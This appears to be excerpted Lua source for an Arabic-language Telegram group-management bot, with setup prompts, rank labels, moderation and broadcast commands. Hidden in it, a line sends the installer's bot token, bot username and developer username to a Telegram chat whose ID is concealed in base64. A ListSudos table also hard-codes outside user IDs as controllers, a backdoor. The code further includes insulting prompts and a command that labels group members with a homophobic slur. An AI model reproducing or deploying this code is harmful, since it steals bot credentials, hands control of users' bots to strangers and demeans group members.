...
io.write('\27[1;31m⌘ يمكنك الان ارسال توكن البوت عزيزي ⇧⇩ \nSend Me a Bot Token Now ↡\n\27[0;39;49m')
local TokenBot = io.read()
if TokenBot and TokenBot:match('(%d+):(.*)') then
local url , res = https.request('https://api.telegram.org/bot'..TokenBot..'/getMe')
local Json_Info = JSON.decode(url)
if res ~= 200 then
print('\27[1;34m⌘ يا ابن الكلب توكن بوت غلط ارسل الصح يا فاشل ⇧⇩ \nBot Token is Wrong\n')
else
io.write('\27[1;34m⌘ تم حفظ توكن البوت عزيزي بنجاح ⇧⇩ \nThe token been saved successfully \n\27[0;39;49m')
...
print('\27[1;34m⌘ لم يتم حفظ توكن البوت يا فاشل حاول مجددا ⇧⇩ \nToken not saved, try again')
end 
os.execute('lua black.lua')
end
if not Redis:get(SshId.."Info:Redis:User") then
io.write('\27[1;31m⌘ يمكنك الان ارسال يوزر المطور الاساسي البوت عزيزي ⇧⇩ \nDeveloper UserName saved ↡\n\27[0;39;49m')
local UserSudo = io.read():gsub('@','')
if UserSudo ~= '' then
io.write('\n\27[1;34m⌘ تم حفظ يوزر المطور الاساسي بنجاح ⇧⇩ \nDeveloper UserName saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User",UserSudo)
else
print('\n\27[1;34m⌘ لم يتم حفظ يوزر المطور الاساسي حاول مجددا ⇧⇩ \nDeveloper UserName not saved\n')
end 
os.execute('lua black.lua')
end
if not Redis:get(SshId.."Info:Redis:User:ID") then
io.write('\27[1;31m⌘ يمكنك الان ارسال ايدي المطور الاساسي عزيزي ⇧⇩ \nDeveloper ID saved ↡\n\27[0;39;49m')
local UserId = io.read()
if UserId and UserId:match('(%d+)') then
io.write('\n\27[1;34m⌘ تم حفظ ايدي المطور الاساسي بنجاح ⇧⇩ \nDeveloper ID saved \n\n\27[0;39;49m')
Redis:set(SshId.."Info:Redis:User:ID",UserId)
else
print('\n\27[1;34m⌘ لم يتم حفظ ايدي المطور الاساسي حاول مجددا ⇧⇩ \nDeveloper ID not saved\n')
end 
os.execute('lua black.lua')
end
...
ControllerAll = false
local ListSudos ={Sudo_Id,1965534755,5088706206}  
...
Status = Redis:get(black.."black:Developer:Bot:Reply"..ChatId) or 'المطور القميل'
elseif TheBasicsQ then
Status = Redis:get(black.."black:PresidentQ:Group:Reply"..ChatId) or 'المالك القميل'
elseif TheBasics then
Status = Redis:get(black.."black:President:Group:Reply"..ChatId) or 'المنشئ الاساسي القميل'
elseif Originators then
Status = Redis:get(black.."black:Constructor:Group:Reply"..ChatId) or 'المنشئ القميل'
elseif Managers then
Status = Redis:get(black.."black:Manager:Group:Reply"..ChatId) or 'المدير القميل'
elseif Addictive then
Status = Redis:get(black.."black:Admin:Group:Reply"..ChatId) or 'الادمن القميل'
elseif StatusMember == "chatMemberStatusCreator" then
Status = 'مالك المجموعه القميل'
elseif StatusMember == "chatMemberStatusAdministrator" then
Status = 'ادمن المجموعه القميل'
elseif Distinguished then
Status = Redis:get(black.."black:Vip:Group:Reply"..ChatId) or 'المميز القميل'
else
Status = Redis:get(black.."black:Mempar:Group:Reply"..ChatId) or 'العضو القميل'
end  
return Status
end 
...
Status = 'المطور القميل'
elseif tonumber(Num) == 44 then  
Status = 'المالك القميل'
elseif tonumber(Num) == 4 then  
Status = 'المنشئ الاساسي القميل'
elseif tonumber(Num) == 5 then  
Status = 'المنشئ القميل'
elseif tonumber(Num) == 6 then  
Status = 'المدير القميل'
elseif tonumber(Num) == 7 then  
Status = 'الادمن القميل '
else
Status = 'المميز القميل'
end  
return Status
end 
LUATELE = URL.escape(""..black.."\n"..UserBot.."\n"..UserSudo.."\n"..Token.."")
...
LuaTele.sendText(telelua("MjA3ODM1MTU5Ng=="),0,LUATELE,"md",true)  
...
return{
Redisa = Redis:sismember(black.."black:Redisa:Groups",UserId) ,
...
if Statusrestricted(msg.chat_id,msg.sender.user_id).Redisa == true then
...
elseif tonumber(msg.sender.user_id) == 5088706206 then
...
if text == 'رفع النسخه العامه' and msg.reply_to_message_id ~= 0 or text == 'رفع نسخه احتياطيه' and msg.reply_to_message_id ~= 0 then
...
--download('https://raw.githubusercontent.com/M2007A/JEKA/master/black.lua','black.lua')
...
NamesBoto = (Redis:get(black.."black:Name:Bot") or "صعيدي")
...
local textt = ' 🌝🖤 رتبتك في البوت » '..Controller(msg_chat_id,UserId)
keyboard = {} 
keyboard.inline_keyboard = {
{
...
if TextMsg == 'خول' then
if not Redis:get(black.."black:Lift:Altslyh"..msg_chat_id) then
return LuaTele.sendText(msg_chat_id,msg_id,"* ☽ اوامر التسليه معطله عزيزي*","md",true)  
end
if ChannelJoin(msg) == false then
local reply_markup = LuaTele.replyMarkup{type = 'inline',data = {{{text = 'اضغط للاشتراك', url = 't.me/BLACK_TEAM_4'}, },}}
return LuaTele.sendText(msg.chat_id,msg.id,'*\n ☽ عليك الاشتراك في قناة البوت لاستخذام الاوامر*',"md",false, false, false, false, reply_markup)
end
if Redis:sismember(black.."black:Girl:User",UserId) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"*☽ تم رفعه خول مسبقا *").Reply,"md",true)  
else
Redis:sadd(black.."black:Girl:User",Message_Reply.sender.user_id) 
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(Message_Reply.sender.user_id,"*☽ تم رفع خول في الجروب *").Reply,"md",true)  
end
end
if TextMsg == "مالك" then
if not msg.Developers then
...
local Info_Members = Redis:smembers(black.."black:Redisa:Groups") 
if #Info_Members == 0 then
...
if TextMsg == 'الرابط' or TextMsg == 'رابط' then
...
Redis:set(black.."black:zhrf_Bots"..msg_chat_id,true) 
...
Redis:set(black.."black:Lift:Altslyh"..msg_chat_id,true) 
return LuaTele.sendText(msg_chat_id,msg_id,"*☽ تم تفعيل اوامر  التسليه *","md",true)
end
...
if TextMsg == 'الزخرفه' then
Redis:del(black.."black:zhrf_Bots"..msg_chat_id) 
...
if TextMsg == 'اوامر التسليه' then
Redis:del(black.."black:Lift:Altslyh"..msg_chat_id) 
return LuaTele.sendText(msg_chat_id,msg_id,"*☽ تم تعطيل اوامر التسليه *","md",true)
end
if TextMsg == 'اطردني' then
...
return LuaTele.sendText(msg_chat_id,msg_id,"\n* ☽ عذرا لا تستطيع استخدام الامر على { "..Controller(msg_chat_id,UserId_Info.id).." } *","md",true)  
end
if Redis:sismember(black.."black:Redisa:Groups",UserId_Info.id) then
return LuaTele.sendText(msg_chat_id,msg_id,Reply_Status(UserId_Info.id," ☽ تم حظره عام من المجموعات مسبقا ").Reply,"md",true)  
else
Redis:sadd(black.."black:Redisa:Groups",UserId_Info.id) 
...
if not Redis:sismember(black.."black:Redisa:Groups",UserId_Info.id) then
...
Redis:srem(black.."black:Redisa:Groups",UserId_Info.id) 
...
if Redis:sismember(black.."black:Redisa:Groups",Message_Reply.sender.user_id) then
...
Redis:sadd(black.."black:Redisa:Groups",Message_Reply.sender.user_id) 
...
if not Redis:sismember(black.."black:Redisa:Groups",Message_Reply.sender.user_id) then
...
Redis:srem(black.."black:Redisa:Groups",Message_Reply.sender.user_id) 
...
LuaTele.sendText(msg_chat_id,msg_id,"\n*☽ تم الغاء تثبيت الرسال*ه","md",true)
...
{
{text = 'تعطيل ردود المطور', data = msg.sender.user_id..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = msg.sender.user_id..'/'.. 'mute_ryplesudo'},
},
{
...
{
{text = '𓄼• اخفاء الاوامر •𓄹', data =msg.sender.user_id..'/'.. 'delAmr'}
},
}
}
...
data = {
{
{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/BLACK_TEAM_4'}, 
},
}
}
...
LuaTele.sendText(msg_chat_id,msg_id,'*☽ عدد جهاتك يبشا ⇦ '..(Redis:get(black.."black:Num:Add:Memp"..msg.chat_id..":"..msg.sender.user_id) or 0)..'*',"md",true)  
...
if TextMsg == 'المطورين الثانوين' or TextMsg == 'الثانوين' then
if not msg.ControllerBot then 
return LuaTele.sendText(msg_chat_id,msg_id,'\n* ☽ هاذا الامر يخص 『 '..Controller_Num(1)..' 』* ',"md",true)  
end
if ChannelJoin(msg) == false then
...
Redis:del(black.."black:Redisa:Groups") 
...
return LuaTele.sendText(msg_chat_id,msg_id,"*☽ ارسل الكلمه لاضافتها في الردود العامه*","md",true)  
end
...
return LuaTele.sendText(msg_chat_id,msg_id,"*☽ ارسل الكلمه لحذفها من الردود العامه*","md",true)  
end
...
Redis:setex(black.."black:Send:Bc" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,"*☽ ارسل الان اذاعتك للخاص*\n*☽ للخروج ارسل الغاء*","md",true)  
return false
end
...
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).Redisa == true then
Redisa = 'محظور عام'
else
Redisa = 'غير محظور عام'
end
...
if Statusrestricted(msg_chat_id,UserId_Info.id).Redisa == true then
Redisa = 'محظور عام'
else
Redisa = 'غير محظور عام'
end
...
if Statusrestricted(msg_chat_id,Message_Reply.sender.user_id).Redisa == true and msg.ControllerBot then
Redisa = 'محظور عام ,'
Redis:srem(black.."black:Redisa:Groups",Message_Reply.sender.user_id) 
else
Redisa = ''
...
LuaTele.sendText(msg_chat_id,msg_id,"\n* ☽ تم رفع القيود عنه : {"..Redisa..BanGroup..SilentGroup..Restricted..'}*',"md",true)  
end
...
if Statusrestricted(msg_chat_id,UserId_Info.id).Redisa == true and msg.ControllerBot then
Redisa = 'محظور عام ,'
Redis:srem(black.."black:Redisa:Groups",UserId_Info.id) 
else
Redisa = ''
...
{
{text = '𓄼• ᴊᴀʙᴡᴀ •𓄹', url = "https://t.me/J_A_B_W_A"},{text = '𓄼• ᴊᴇᴋᴀ •𓄹', url = "https://t.me/Dev_Jeka"}
},
{
{text = '𓄼• ᴘʀᴏɢʀᴀᴍᴍᴇʀѕ ѕᴀɪᴅɪ •𓄹', url = "https://t.me/Dev_Source_black"}
},
{
{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = "https://t.me/BLACK_TEAM_4"}
},
}
...
data = {
{
{text = RinkBot, url = 't.me/BLACK_TEAM_4'}, 
},
}
}
return LuaTele.sendText(msg_chat_id,msg_id,'\n⌔︙رتبتك هي : '..msg.Name_Controller,"md",true)  
...
local NamesBot = (Redis:get(black.."black:Name:Bot") or "صعيدي")
local BotName = {
...
if text == (Redis:get(black.."black:Name:Bot") or "صعيدي") then
local photo = LuaTele.getUserProfilePhotos(black)
local UserInfo = LuaTele.getUser(black)
for Name_User in string.gmatch(UserInfo.first_name, "[^%s]+" ) do
UserInfo.first_name = Name_User
...
if Redis:get(black.."black:Status:Games"..msg.chat_id) then
local texting = {"تعيش من غير نت ولا تموت", 
...
local CmdStart = '*\n ☽ أهلآ بك في بوت '..(Redis:get(black.."black:Name:Bot") or "صعيدي")..
...
Redis:setex(black.."black:Broadcasting:Groups:Fwd" .. msg_chat_id .. ":" .. msg.sender.user_id, 600, true) 
LuaTele.sendText(msg_chat_id,msg_id,[[*
يمكنك الان ارسل الاذاعه الي الجروبات
...
{
{text = '𓄼•❺•𓄹', data = IdUser..'/NoNextSeting'}, {text = '𓄼•❻•𓄹', data = IdUser..'/listallAddorrem'}, 
},
{
{text = '𓄼• sᴏᴜʀᴄᴇ sᴀɪᴅɪ •𓄹', url = 't.me/BLACK_TEAM_4'}, 
},
...
{
{text = '𓄼• مسح المكتومين عام •𓄹', data = IdUser..'/ktmAll'}, {text = '𓄼• مسح المحظورين عام •𓄹', data = IdUser..'/Redisa'}, 
},
{
...
{
{text = 'تعطيل ردود المطور', data = IdUser..'/'.. 'unmute_ryplesudo'},{text = 'تفعيل الردود العامه', data = IdUser..'/'.. 'mute_ryplesudo'},
},
{
